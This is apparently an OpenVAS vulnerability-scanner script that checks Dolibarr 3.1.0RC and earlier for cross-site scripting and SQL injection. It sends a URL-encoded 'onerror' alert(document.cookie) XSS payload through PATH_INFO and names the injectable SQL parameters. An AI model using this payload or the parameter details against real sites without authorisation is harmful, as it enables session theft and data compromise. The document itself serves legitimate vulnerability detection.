###############################################################################
# OpenVAS Vulnerability Test
# $Id: secpod_dolibarr_mult_xss_and_sql_inj_vuln.nasl 3570 2016-06-21 07:49:45Z benallard $
#
# Dolibarr Multiple Cross Site Scripting and SQL Injection Vulnerabilities
#
# Authors:
# Rachana Shetty <srachana@secpod.com>
#
# Copyright:
# Copyright (c) 2011 SecPod, http://www.secpod.com
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

tag_impact = "Successful exploitation will allow attacker to execute arbitrary HTML and
  script code in a user's browser session in the context of a vulnerable site
  and to cause SQL Injection attack to gain sensitive information.
  Impact Level: Application";
tag_affected = "Dolibarr version 3.1.0RC and prior";
tag_insight = "The flaws are due to improper validation of user-supplied input
  - Passed via PATH_INFO to multiple scripts allows attackers to inject
    arbitrary HTML code.
  - Passed via the 'sortfield', 'sortorder', 'sall', 'id' and 'rowid'
    parameters to multiple scripts, which allows attackers to manipulate SQL
    queries by injecting arbitrary SQL code.";
tag_solution = "Upgrade to Dolibarr version 3.1RC3 or later
  For updates refer to http://www.dolibarr.org/";
tag_summary = "This host is running Dolibarr and is prone to multiple cross site scripting
  and SQL injection vulnerabilities.";

if(description)
{
  script_id(902644);
  script_version("$Revision: 3570 $");
  script_cve_id("CVE-2011-4814", "CVE-2011-4802");
  script_bugtraq_id(50777);
  script_tag(name:"cvss_base", value:"6.5");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:S/C:P/I:P/A:P");
  script_tag(name:"last_modification", value:"$Date: 2016-06-21 09:49:45 +0200 (Tue, 21 Jun 2016) $");
  script_tag(name:"creation_date", value:"2011-12-15 14:02:22 +0530 (Thu, 15 Dec 2011)");
  script_name("Dolibarr Multiple Cross Site Scripting and SQL Injection Vulnerabilities");
  script_xref(name : "URL" , value : "http://seclists.org/bugtraq/2011/Nov/144");
  script_xref(name : "URL" , value : "http://www.securityfocus.com/archive/1/520619");
  script_xref(name : "URL" , value : "https://www.htbridge.ch/advisory/multiple_vulnerabilities_in_dolibarr.html");

  script_tag(name:"qod_type", value:"remote_vul");
  script_summary("Check for Dolibarr is vulnerable to XSS");
  script_category(ACT_ATTACK);
  script_copyright("Copyright (C) 2011 SecPod");
  script_family("Web application abuses");
  script_dependencies("gb_dolibarr_detect.nasl");
  script_require_ports("Services/www", 80);
  script_tag(name : "impact" , value : tag_impact);
  script_tag(name : "affected" , value : tag_affected);
  script_tag(name : "insight" , value : tag_insight);
  script_tag(name : "solution" , value : tag_solution);
  script_tag(name : "summary" , value : tag_summary);
  exit(0);
}

##
## The script code starts here
##

include("http_func.inc");
include("host_details.inc");
include("version_func.inc");
include("http_keepalive.inc");

## Get HTTP Port
port = get_http_port(default:80);
if(!port){
  exit(0);
}

## Check Host Supports PHP
if(!can_host_php(port:port)){
  exit(0);
}

## Get Dolibarr Installed Location
if(!dir = get_dir_from_kb(port:port, app:"dolibarr")){
  exit(0);
}

## Construct the attack request
url = string(dir, '/index.php/%22%3E%3Cimg%20src=1%20onerror=javascript' +
                  ':alert(document.cookie)%3E');

## Try attack and check the response to confirm vulnerability
if(http_vuln_check(port:port, url:url, check_header:TRUE, pattern:"onerror=javascript" +
                       ":alert\(document.cookie\)>")){
  security_message(port);
}
